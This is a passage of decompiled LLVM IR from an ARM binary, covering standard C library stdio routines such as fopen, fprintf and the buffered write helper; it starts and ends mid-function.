  uselistorder i32 %v0_2a290, { 1, 0, 2 }
  uselistorder i32 %v1_2a274.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_2a25c, { 1, 0 }
  uselistorder i32 %v0_2a214, { 1, 0, 2 }
  uselistorder i32 %v1_2a1f8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2a188, { 1, 0, 2 }
  uselistorder i32 %v1_2a16c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2a15c, { 1, 0 }
  uselistorder i32 %v0_2a118, { 1, 0, 2 }
  uselistorder i32 %v1_2a0fc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2a0dc, { 1, 0 }
  uselistorder i32 %v1_2a068.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 9, 8, 0, 10, 11, 12, 13, 14, 16, 15, 1, 17, 20, 18, 19, 21, 23, 22, 2, 24, 25, 26, 27, 28, 30, 29, 3, 31, 32, 33, 34, 36, 35, 4, 37, 38, 39, 40, 41, 42, 43, 45, 44, 5, 46 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 6, 7, 9, 8, 0, 10, 11, 13, 12, 1, 14, 15, 16, 18, 17, 2, 19, 20, 21, 22, 24, 23, 3, 25, 26, 28, 27, 4, 29, 30, 31, 33, 32, 5, 34, 35 }
  uselistorder label %dec_label_pc_2a32c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_2a304, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a2ec, { 1, 0 }
  uselistorder label %dec_label_pc_2a2a4, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_2a294, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a27c, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_2a240, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_2a218, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a200, { 1, 0 }
  uselistorder label %dec_label_pc_2a1b4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_2a18c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a174, { 1, 0 }
  uselistorder label %dec_label_pc_2a12c, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_2a11c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a104, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_2a0a4, { 1, 0 }
  uselistorder label %dec_label_pc_2a098, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_2a088, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a070, { 1, 0 }
}

define i32 @function_2a344(i16* %arg1) local_unnamed_addr {
dec_label_pc_2a344:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_2a344 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2a344, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_2a344
  %v2_2a344 = trunc i32 %tmp to i16
  store i16 %v2_2a344, i16* %arg1, align 2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_2a344, %bb
  %v10_2a34c = phi i32 [ %tmp, %dec_label_pc_2a344 ], [ 0, %bb ]
  ret i32 %v10_2a34c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_2a360 = call i32 @_stdio_fopen()
  ret i32 %v0_2a360
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_2a37c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_2a37c, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_2a38c = call i32 @__GI_vfprintf()
  ret i32 %v0_2a38c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v15_2a3a0 = load i32, i32* @r8, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_2a4642 = icmp eq i32 %arg3, 0
  store i1 %v2_2a4642, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2a4642, label %dec_label_pc_2a46c, label %dec_label_pc_2a3bc

dec_label_pc_2a3bc:                               ; preds = %entry, %dec_label_pc_2a464thread-pre-split.dec_label_pc_2a3bc_crit_edge
  %v0_2a3c8 = phi i32 [ %v0_2a3c8.pre, %dec_label_pc_2a464thread-pre-split.dec_label_pc_2a3bc_crit_edge ], [ %tmp, %entry ]
  %v0_2a3c4 = phi i32 [ %v5_2a3d4, %dec_label_pc_2a464thread-pre-split.dec_label_pc_2a3bc_crit_edge ], [ %arg2, %entry ]
  %v3_2a3bc = phi i32 [ %v3_2a3bc.pre, %dec_label_pc_2a464thread-pre-split.dec_label_pc_2a3bc_crit_edge ], [ 2147483647, %entry ]
  %v0_2a3c0.in = phi i32 [ %v5_2a3d8, %dec_label_pc_2a464thread-pre-split.dec_label_pc_2a3bc_crit_edge ], [ %arg3, %entry ]
  %v3_2a3c0 = phi i32 [ %v5_2a3d8, %dec_label_pc_2a464thread-pre-split.dec_label_pc_2a3bc_crit_edge ], [ %arg3, %entry ]
  %v0_2a3c0 = icmp slt i32 %v0_2a3c0.in, 0
  %storemerge = select i1 %v0_2a3c0, i32 %v3_2a3bc, i32 %v3_2a3c0
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_2a3c4, i32* %r1.global-to-local, align 4
  %v1_2a3c8 = add i32 %v0_2a3c8, 4
  %v2_2a3c8 = inttoptr i32 %v1_2a3c8 to i32*
  %v3_2a3c8 = load i32, i32* %v2_2a3c8, align 4
  %v3_2a3cc = trunc i32 %v0_2a3c4 to i16
  %v4_2a3cc = call i32 @__GI___libc_write(i32 %v3_2a3c8, i16 %v3_2a3cc)
  %v1_2a3d0 = icmp slt i32 %v4_2a3cc, 0
  %v2_2a3d0 = icmp eq i32 %v4_2a3cc, 0
  store i1 %v2_2a3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_2a3d0, label %dec_label_pc_2a3e0, label %dec_label_pc_2a464thread-pre-split

dec_label_pc_2a3e0:                               ; preds = %dec_label_pc_2a3bc
  %v0_2a3e0 = load i32, i32* @r4, align 4
  %v1_2a3e0 = inttoptr i32 %v0_2a3e0 to i16*
  %v2_2a3e0 = load i16, i16* %v1_2a3e0, align 2
  %v1_2a3e4 = or i16 %v2_2a3e0, 8
  store i16 %v1_2a3e4, i16* %v1_2a3e0, align 2
  store i32 99640, i32* %r3.global-to-local, align 4
  %v0_2a3f0 = call i32 @__aeabi_read_tp()
  %v3_2a3f4 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2a3f4 = sext i16 %v3_2a3f4 to i32
  store i32 %v4_2a3f4, i32* %r3.global-to-local, align 4
  %v2_2a3f8 = add i32 %v4_2a3f4, %v0_2a3f0
  %v3_2a3f8 = inttoptr i32 %v2_2a3f8 to i32*
  %v4_2a3f8 = load i32, i32* %v3_2a3f8, align 4
  store i32 %v4_2a3f8, i32* %r3.global-to-local, align 4
  %v7_2a3fc = icmp eq i32 %v4_2a3f8, 4
  store i1 %v7_2a3fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2a3fc, label %dec_label_pc_2a408, label %bb21

bb21:                                             ; preds = %dec_label_pc_2a3e0
  %v8_2a400 = icmp eq i32 %v4_2a3f8, 11
  store i1 %v8_2a400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_2a400, label %dec_label_pc_2a408, label %dec_label_pc_2a46c

dec_label_pc_2a408:                               ; preds = %dec_label_pc_2a3e0, %bb21
  %v0_2a408 = load i32, i32* @r4, align 4
  %v1_2a408 = add i32 %v0_2a408, 8
  store i32 %v1_2a408, i32* %r2.global-to-local, align 4
  %v1_2a40c = inttoptr i32 %v1_2a408 to i32*
  %v2_2a40c = load i32, i32* %v1_2a40c, align 4
  store i32 %v2_2a40c, i32* %r2.global-to-local, align 4
  %v3_2a40c = add i32 %v0_2a408, 12
  %v4_2a40c = inttoptr i32 %v3_2a40c to i32*
  %v5_2a40c = load i32, i32* %v4_2a40c, align 4
  store i32 %v5_2a40c, i32* %r3.global-to-local, align 4
  %v2_2a410 = sub i32 %v5_2a40c, %v2_2a40c
  store i32 %v2_2a410, i32* %r1.global-to-local, align 4
  %v9_2a410 = icmp eq i32 %v5_2a40c, %v2_2a40c
  store i1 %v9_2a410, i1* %cpsr_z.global-to-local, align 1
  %v0_2a45c.pre = load i32, i32* @r5, align 4
  br i1 %v9_2a410, label %dec_label_pc_2a45c, label %dec_label_pc_2a418

dec_label_pc_2a418:                               ; preds = %dec_label_pc_2a408
  %v3_2a418 = icmp ult i32 %v2_2a410, %v0_2a45c.pre
  %v9_2a418 = icmp eq i32 %v2_2a410, %v0_2a45c.pre
  store i1 %v9_2a418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2a418, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_2a418
  store i32 %v0_2a45c.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_2a418, %bb22, %dec_label_pc_2a440
  %v2_2a42c = phi i32 [ %v1_2a444, %dec_label_pc_2a440 ], [ %v2_2a40c, %bb22 ], [ %v2_2a40c, %dec_label_pc_2a418 ]
  %v0_2a420 = load i32, i32* @r6, align 4
  %v1_2a420 = inttoptr i32 %v0_2a420 to i8*
  %v2_2a420 = load i8, i8* %v1_2a420, align 1
  %v3_2a420 = zext i8 %v2_2a420 to i32
  store i32 %v3_2a420, i32* %r3.global-to-local, align 4
  %v7_2a424 = icmp eq i8 %v2_2a420, 10
  store i1 %v7_2a424, i1* %cpsr_z.global-to-local, align 1
  %v1_2a428 = add i32 %v0_2a420, 1
  store i32 %v1_2a428, i32* @r6, align 4
  %v3_2a42c = inttoptr i32 %v2_2a42c to i8*
  store i8 %v2_2a420, i8* %v3_2a42c, align 1
  %v0_2a430 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2a430, label %dec_label_pc_2a434, label %dec_label_pc_2a440

dec_label_pc_2a434:                               ; preds = %.preheader
  %v0_2a434 = load i32, i32* @r4, align 4
  %v1_2a434 = inttoptr i32 %v0_2a434 to i16*
  %v2_2a434 = load i16, i16* %v1_2a434, align 2
  %v3_2a434 = zext i16 %v2_2a434 to i32
  store i32 %v3_2a434, i32* %r3.global-to-local, align 4
  %v1_2a438 = and i32 %v3_2a434, 256
  %v2_2a438 = icmp eq i32 %v1_2a438, 0
  store i1 %v2_2a438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2a438, label %dec_label_pc_2a440, label %dec_label_pc_2a434.dec_label_pc_2a44c_crit_edge

dec_label_pc_2a434.dec_label_pc_2a44c_crit_edge:  ; preds = %dec_label_pc_2a434
  %v0_2a450.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2a44c

dec_label_pc_2a440:                               ; preds = %dec_label_pc_2a434, %.preheader
  %v0_2a440 = load i32, i32* %r1.global-to-local, align 4
  %v1_2a440 = add i32 %v0_2a440, -1
  store i32 %v1_2a440, i32* %r1.global-to-local, align 4
  %v7_2a440 = icmp eq i32 %v0_2a440, 1
  store i1 %v7_2a440, i1* %cpsr_z.global-to-local, align 1
  %v0_2a444 = load i32, i32* %r2.global-to-local, align 4
  %v1_2a444 = add i32 %v0_2a444, 1
  store i32 %v1_2a444, i32* %r2.global-to-local, align 4
  br i1 %v7_2a440, label %dec_label_pc_2a440.dec_label_pc_2a44c_crit_edge, label %.preheader

dec_label_pc_2a440.dec_label_pc_2a44c_crit_edge:  ; preds = %dec_label_pc_2a440
  %v0_2a44c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2a44c

dec_label_pc_2a44c:                               ; preds = %dec_label_pc_2a434.dec_label_pc_2a44c_crit_edge, %dec_label_pc_2a440.dec_label_pc_2a44c_crit_edge
  %v0_2a450 = phi i32 [ %v1_2a444, %dec_label_pc_2a440.dec_label_pc_2a44c_crit_edge ], [ %v0_2a450.pre, %dec_label_pc_2a434.dec_label_pc_2a44c_crit_edge ]
  %v0_2a44c = phi i32 [ %v0_2a44c.pre, %dec_label_pc_2a440.dec_label_pc_2a44c_crit_edge ], [ %v0_2a434, %dec_label_pc_2a434.dec_label_pc_2a44c_crit_edge ]
  %v1_2a44c = add i32 %v0_2a44c, 8
  %v2_2a44c = inttoptr i32 %v1_2a44c to i32*
  %v3_2a44c = load i32, i32* %v2_2a44c, align 4
  store i32 %v3_2a44c, i32* %r3.global-to-local, align 4
  %v2_2a450 = add i32 %v0_2a44c, 16
  %v3_2a450 = inttoptr i32 %v2_2a450 to i32*
  store i32 %v0_2a450, i32* %v3_2a450, align 4
  %v0_2a454 = load i32, i32* %r3.global-to-local, align 4
  %v1_2a454 = load i32, i32* %r2.global-to-local, align 4
  %v2_2a454 = sub i32 %v1_2a454, %v0_2a454
  store i32 %v2_2a454, i32* %r3.global-to-local, align 4
  %v1_2a458 = load i32, i32* @r5, align 4
  %v2_2a458 = sub i32 %v1_2a458, %v2_2a454
  br label %dec_label_pc_2a45c

dec_label_pc_2a45c:                               ; preds = %dec_label_pc_2a408, %dec_label_pc_2a44c
  %v0_2a45c = phi i32 [ %v2_2a458, %dec_label_pc_2a44c ], [ %v0_2a45c.pre, %dec_label_pc_2a408 ]
  %v1_2a45c = load i32, i32* @r7, align 4
  %v2_2a45c = sub i32 %v1_2a45c, %v0_2a45c
  store i32 %v2_2a45c, i32* @r7, align 4
  br label %dec_label_pc_2a46c

dec_label_pc_2a464thread-pre-split:               ; preds = %dec_label_pc_2a3bc
  %v3_2a3d4 = load i32, i32* @r6, align 4
  %v5_2a3d4 = add i32 %v3_2a3d4, %v4_2a3cc
  store i32 %v5_2a3d4, i32* @r6, align 4
  %v4_2a3d8 = load i32, i32* @r5, align 4
  %v5_2a3d8 = sub i32 %v4_2a3d8, %v4_2a3cc
  store i32 %v5_2a3d8, i32* @r5, align 4
  %v2_2a464 = icmp eq i32 %v5_2a3d8, 0
  store i1 %v2_2a464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2a464, label %dec_label_pc_2a46c, label %dec_label_pc_2a464thread-pre-split.dec_label_pc_2a3bc_crit_edge

dec_label_pc_2a464thread-pre-split.dec_label_pc_2a3bc_crit_edge: ; preds = %dec_label_pc_2a464thread-pre-split
  %v3_2a3bc.pre = load i32, i32* @r8, align 4
  %v0_2a3c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2a3bc

dec_label_pc_2a46c:                               ; preds = %dec_label_pc_2a464thread-pre-split, %entry, %bb21, %dec_label_pc_2a45c
  %v0_2a46c = load i32, i32* @r7, align 4
  store i32 %v15_2a3a0, i32* @r8, align 4
  ret i32 %v0_2a46c

; uselistorder directives
  uselistorder i32 %v5_2a3d8, { 1, 3, 0, 2 }
  uselistorder i32 %v5_2a3d4, { 1, 0 }
  uselistorder i32 %v0_2a44c, { 1, 0 }
  uselistorder i32 %v1_2a444, { 0, 2, 1 }
  uselistorder i32 %v0_2a440, { 1, 0 }
  uselistorder i32 %v0_2a45c.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_2a40c, { 1, 0, 2 }
  uselistorder i32 %v2_2a40c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v4_2a3cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_2a3c4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i32, i16)* @__GI___libc_write, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_2a46c, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_2a45c, { 1, 0 }
  uselistorder label %dec_label_pc_2a44c, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a408, { 1, 0 }
  uselistorder label %dec_label_pc_2a3bc, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_2a47c = load i32, i32* @r4, align 4
  store i32 %v3_2a47c, i32* %stack_var_-24, align 4
  %v6_2a47c = load i32, i32* @r5, align 4
  %v9_2a47c = load i32, i32* @r6, align 4
  %v12_2a47c = load i32, i32* @r7, align 4
  %v15_2a47c = load i32, i32* @r8, align 4
  %v0_2a480 = load i32, i32* @r1, align 4
  %v1_2a480 = inttoptr i32 %v0_2a480 to i8*
  %v2_2a480 = load i8, i8* %v1_2a480, align 1
  %v3_2a480 = zext i8 %v2_2a480 to i32
  store i32 %v3_2a480, i32* @ip, align 4
  %v2_2a488 = icmp ugt i8 %v2_2a480, 113
  store i1 %v2_2a488, i1* %cpsr_c.global-to-local, align 1
  %v7_2a488 = icmp eq i8 %v2_2a480, 114
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r8, align 4
  %v0_2a494 = load i32, i32* @r0, align 4
  store i32 %v0_2a494, i32* @r7, align 4
  %v0_2a498 = load i32, i32* @r2, align 4
  store i32 %v0_2a498, i32* @r5, align 4
  %v0_2a49c = load i32, i32* @r3, align 4
  store i32 %v0_2a49c, i32* @r6, align 4
  br i1 %v7_2a488, label %dec_label_pc_2a4f0, label %dec_label_pc_2a4a4

dec_label_pc_2a4a4:                               ; preds = %entry
  %v2_2a4a4 = icmp ugt i8 %v2_2a480, 118
  store i1 %v2_2a4a4, i1* %cpsr_c.global-to-local, align 1
  %v7_2a4a4 = icmp eq i8 %v2_2a480, 119
  br i1 %v7_2a4a4, label %bb, label %dec_label_pc_2a4b0

bb:                                               ; preds = %dec_label_pc_2a4a4
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_2a4f4

dec_label_pc_2a4b0:                               ; preds = %dec_label_pc_2a4a4
  %v2_2a4b0 = icmp ugt i8 %v2_2a480, 96
  store i1 %v2_2a4b0, i1* %cpsr_c.global-to-local, align 1
  %v7_2a4b0 = icmp eq i8 %v2_2a480, 97
  br i1 %v7_2a4b0, label %bb49, label %dec_label_pc_2a4bc

bb49:                                             ; preds = %dec_label_pc_2a4b0
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_2a4f4

dec_label_pc_2a4bc:                               ; preds = %dec_label_pc_2a4b0, %dec_label_pc_2a58c, %dec_label_pc_2a560
  store i32 99432, i32* %r2.global-to-local, align 4
  %v0_2a4c0 = call i32 @__aeabi_read_tp()
  store i32 %v0_2a4c0, i32* %r0.global-to-local, align 4
  %v3_2a4c4 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2a4c4 = sext i16 %v3_2a4c4 to i32
  store i32 %v4_2a4c4, i32* @r2, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_2a4cc = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a4cc = icmp eq i32 %v0_2a4cc, 0
  %v3_2a4d0 = add i32 %v4_2a4c4, %v0_2a4c0
  %v4_2a4d0 = inttoptr i32 %v3_2a4d0 to i32*
  store i32 22, i32* %v4_2a4d0, align 4
  br i1 %v2_2a4cc, label %dec_label_pc_2a894, label %dec_label_pc_2a4d8

dec_label_pc_2a4d8:                               ; preds = %dec_label_pc_2a5b0._crit_edge, %dec_label_pc_2a4bc
  %v0_2a4d8 = load i32, i32* @r5, align 4
  %v1_2a4d8 = inttoptr i32 %v0_2a4d8 to i16*
  %v2_2a4d8 = load i16, i16* %v1_2a4d8, align 2
  %v3_2a4d8 = zext i16 %v2_2a4d8 to i32
  store i32 %v3_2a4d8, i32* %r3.global-to-local, align 4
  %v1_2a4dc = and i32 %v3_2a4d8, 8192
  %v2_2a4dc = icmp eq i32 %v1_2a4dc, 0
  br i1 %v2_2a4dc, label %dec_label_pc_2a894, label %dec_label_pc_2a4e4

dec_label_pc_2a4e4:                               ; preds = %dec_label_pc_2a4d8
  store i32 %v0_2a4d8, i32* @r0, align 4
  %v0_2a4e8 = call i32 @free()
  store i32 %v0_2a4e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2a894

dec_label_pc_2a4f0:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_2a4f4

dec_label_pc_2a4f4:                               ; preds = %bb, %bb49, %dec_label_pc_2a4f0
  %v1_2a50c = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_2a4f0 ]
  %v1_2a4f4 = add i32 %v0_2a480, 1
  %v2_2a4f4 = inttoptr i32 %v1_2a4f4 to i8*
  %v3_2a4f4 = load i8, i8* %v2_2a4f4, align 1
  %v2_2a4f8 = icmp ugt i8 %v3_2a4f4, 97
  store i1 %v2_2a4f8, i1* %cpsr_c.global-to-local, align 1
  %v7_2a4f8 = icmp eq i8 %v3_2a4f4, 98
  %v1_2a4f4.v0_2a480 = select i1 %v7_2a4f8, i32 %v1_2a4f4, i32 %v0_2a480
  store i32 %v1_2a4f4.v0_2a480, i32* %r3.global-to-local, align 4
  %v1_2a504 = add i32 %v1_2a4f4.v0_2a480, 1
  %v2_2a504 = inttoptr i32 %v1_2a504 to i8*
  %v3_2a504 = load i8, i8* %v2_2a504, align 1
  %v4_2a504 = zext i8 %v3_2a504 to i32
  store i32 %v4_2a504, i32* @r3, align 4
  %v2_2a508 = icmp ugt i8 %v3_2a504, 42
  store i1 %v2_2a508, i1* %cpsr_c.global-to-local, align 1
  %v7_2a508 = icmp eq i8 %v3_2a504, 43
  br i1 %v7_2a508, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_2a4f4
  store i32 %v1_2a50c, i32* @r3, align 4
  %v2_2a510 = add nuw nsw i32 %v1_2a50c, 1
  store i32 %v2_2a510, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_2a4f4, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a514 = icmp eq i32 %v0_2a498, 0
  br i1 %v2_2a514, label %dec_label_pc_2a51c, label %dec_label_pc_2a558

dec_label_pc_2a51c:                               ; preds = %.thread3
  store i32 68, i32* %r0.global-to-local, align 4
  %v1_2a520 = call i32 @malloc(i32 68)
  store i32 %v1_2a520, i32* %r0.global-to-local, align 4
  store i32 %v1_2a520, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_2a524 = icmp eq i32 %v1_2a520, 0
  br i1 %v3_2a524, label %dec_label_pc_2a898, label %dec_label_pc_2a52c

dec_label_pc_2a52c:                               ; preds = %dec_label_pc_2a51c
  %v0_2a530 = load i32, i32* @r8, align 4
  %v2_2a530 = add i32 %v0_2a530, -33376
  store i32 %v2_2a530, i32* %r3.global-to-local, align 4
  %v1_2a534 = inttoptr i32 %v2_2a530 to i32*
  %v2_2a534 = load i32, i32* %v1_2a534, align 4
  store i32 %v2_2a534, i32* %r0.global-to-local, align 4
  %v3_2a534 = add i32 %v0_2a530, -33372
  %v4_2a534 = inttoptr i32 %v3_2a534 to i32*
  %v5_2a534 = load i32, i32* %v4_2a534, align 4
  store i32 %v5_2a534, i32* %r1.global-to-local, align 4
  %v6_2a534 = add i32 %v0_2a530, -33368
  %v7_2a534 = inttoptr i32 %v6_2a534 to i32*
  %v8_2a534 = load i32, i32* %v7_2a534, align 4
  store i32 %v8_2a534, i32* %r2.global-to-local, align 4
  %v2_2a540 = add i32 %v1_2a520, 8
  %v3_2a540 = inttoptr i32 %v2_2a540 to i32*
  store i32 0, i32* %v3_2a540, align 4
  store i32 8192, i32* @ip, align 4
  %v2_2a548 = load i32, i32* @r5, align 4
  %v3_2a548 = inttoptr i32 %v2_2a548 to i16*
  store i16 8192, i16* %v3_2a548, align 2
  %v2_2a54c = load i32, i32* %r0.global-to-local, align 4
  %v0_2a550 = load i32, i32* @r5, align 4
  %v1_2a550 = add i32 %v0_2a550, 56
  store i32 %v1_2a550, i32* @r3, align 4
  %v1_2a554 = inttoptr i32 %v1_2a550 to i32*
  store i32 %v2_2a54c, i32* %v1_2a554, align 4
  %v3_2a554 = add i32 %v0_2a550, 60
  %v4_2a554 = inttoptr i32 %v3_2a554 to i32*
  %v5_2a554 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2a554, i32* %v4_2a554, align 4
  %v6_2a554 = add i32 %v0_2a550, 64
  %v7_2a554 = inttoptr i32 %v6_2a554 to i32*
  %v8_2a554 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_2a554, i32* %v7_2a554, align 4
  %v0_2a558.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2a558

dec_label_pc_2a558:                               ; preds = %.thread3, %dec_label_pc_2a52c
  %v0_2a5b0 = phi i32 [ %v0_2a49c, %.thread3 ], [ %v0_2a558.pre, %dec_label_pc_2a52c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2a558 = icmp slt i32 %v0_2a5b0, 0
  br i1 %v1_2a558, label %dec_label_pc_2a5b0, label %dec_label_pc_2a560

dec_label_pc_2a560:                               ; preds = %dec_label_pc_2a558
  %v0_2a564 = load i32, i32* @r4, align 4
  %v2_2a564 = and i32 %v0_2a564, 131075
  %v1_2a568 = add nuw nsw i32 %v2_2a564, 1
  store i32 %v1_2a568, i32* %r2.global-to-local, align 4
  %v0_2a56c = load i32, i32* @r7, align 4
  %v1_2a56c = add i32 %v0_2a56c, 1
  %v2_2a570 = and i32 %v1_2a56c, %v1_2a568
  store i32 %v2_2a570, i32* %r3.global-to-local, align 4
  %v3_2a574 = icmp uge i32 %v2_2a570, %v1_2a568
  store i1 %v3_2a574, i1* %cpsr_c.global-to-local, align 1
  %v9_2a574 = icmp eq i32 %v2_2a570, %v1_2a568
  %v1_2a578 = load i32, i32* @r5, align 4
  %v2_2a578 = add i32 %v1_2a578, 4
  %v3_2a578 = inttoptr i32 %v2_2a578 to i32*
  store i32 %v0_2a5b0, i32* %v3_2a578, align 4
  br i1 %v9_2a574, label %dec_label_pc_2a580, label %dec_label_pc_2a4bc

dec_label_pc_2a580:                               ; preds = %dec_label_pc_2a560
  %v0_2a580 = load i32, i32* @r4, align 4
  %v1_2a580 = load i32, i32* @r7, align 4
  %v2_2a580 = sub i32 -1, %v1_2a580
  %v3_2a580 = and i32 %v0_2a580, %v2_2a580
  store i32 %v3_2a580, i32* @r3, align 4
  %v1_2a584 = and i32 %v3_2a580, 1024
  %v2_2a584 = icmp eq i32 %v1_2a584, 0
  br i1 %v2_2a584, label %dec_label_pc_2a5a4, label %dec_label_pc_2a58c

dec_label_pc_2a58c:                               ; preds = %dec_label_pc_2a580
  %v0_2a58c = load i32, i32* @r6, align 4
  store i32 %v0_2a58c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_2a598 = call i32 @__libc_fcntl(i32 %v0_2a58c, i32 4)
  store i32 %v2_2a598, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a59c = icmp eq i32 %v2_2a598, 0
  br i1 %v2_2a59c, label %dec_label_pc_2a58c.dec_label_pc_2a5a4_crit_edge, label %dec_label_pc_2a4bc

dec_label_pc_2a58c.dec_label_pc_2a5a4_crit_edge:  ; preds = %dec_label_pc_2a58c
  %v0_2a5a4.pre = load i32, i32* @r7, align 4
  %v0_2a5a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2a5a4

dec_label_pc_2a5a4:                               ; preds = %dec_label_pc_2a58c.dec_label_pc_2a5a4_crit_edge, %dec_label_pc_2a580
  %v0_2a5a8 = phi i32 [ %v0_2a5a8.pre, %dec_label_pc_2a58c.dec_label_pc_2a5a4_crit_edge ], [ %v0_2a580, %dec_label_pc_2a580 ]
  %v0_2a5a4 = phi i32 [ %v0_2a5a4.pre, %dec_label_pc_2a58c.dec_label_pc_2a5a4_crit_edge ], [ %v1_2a580, %dec_label_pc_2a580 ]
  %v1_2a5a4 = and i32 %v0_2a5a4, 131072
